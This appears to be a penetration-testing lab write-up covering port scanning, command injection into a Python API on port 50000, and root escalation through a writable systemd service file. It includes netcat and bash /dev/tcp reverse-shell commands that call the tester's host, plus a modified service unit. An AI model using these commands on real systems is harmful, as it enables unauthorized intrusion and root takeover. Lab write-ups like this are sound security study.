`nmap -A -T4 -p- 192.168.152.117`

```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.244
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
18000/tcp open  biimenu?
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

# FTP
anon logon gets stuck in passive mode.

# SMB
Appears open but no access

![](Images/Pasted%20image%2020250504110956.png)
# HTTP

## Port 80 
is a default landing page

![](Images/Pasted%20image%2020250504111102.png)

## Port 18000
Is a landing page for an app called protomba.

![](Images/Pasted%20image%2020250504111253.png)

I couldn't find anything related to this on google.
## Port 50000 
appears to be an API of some sort. Lets see if we can break the API.

![](Images/Pasted%20image%2020250504111121.png)

![](Images/Pasted%20image%2020250504111131.png)

![](Images/Pasted%20image%2020250504111139.png)

Taking a second look at this, if its verifying out input we could potentially get execution. Lets go ahead and test some HTTP requests to see if its executing out input. Since this application is running on python we can test something like an os.system command.

Testing modification of the API I was able to modify the post request in order to get some execution

```
POST /verify HTTP/1.1
Host: 192.168.152.117:50000
Content-Type: application/x-www-form-urlencoded
Content-Length: [calculated automatically]

code=5*5
```

![](Images/Pasted%20image%2020250504113748.png)

We can use this to check if python exists. Knowing we have some execution we can establish a reverse shell

![](Images/Pasted%20image%2020250504113806.png)

`os.system("nc -e /bin/bash 192.168.45.244 18000")` to get a shell.

![](Images/Pasted%20image%2020250504114009.png)

Lets go ahead and grab the local proof

![](Images/Pasted%20image%2020250504114104.png)

# Post Exploit

Transfer over linpeas and execute.

Found something potential 

![](Images/Pasted%20image%2020250504114411.png)

we have write privileges over /etc/systemd/system/pythonapp.service

![](Images/Pasted%20image%2020250504114713.png)

We can adjust the ExecStart and the user to get an escalated shell
`/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.244/50000 0>&1'`
`User=root`

```
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=/bin/bash -c ‘bash -i >& /dev/tcp/192.168.45.244/50000 0>&1
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target

```

`cat <<'EOT'> /etc/systemd/system/pythonapp.service` to allow us to overwrite the file.

![](Images/Pasted%20image%2020250504121428.png)

We can use `sudo /sbin/reboot` to reboot the service to pop our root shell.

![](Images/Pasted%20image%2020250504123348.png)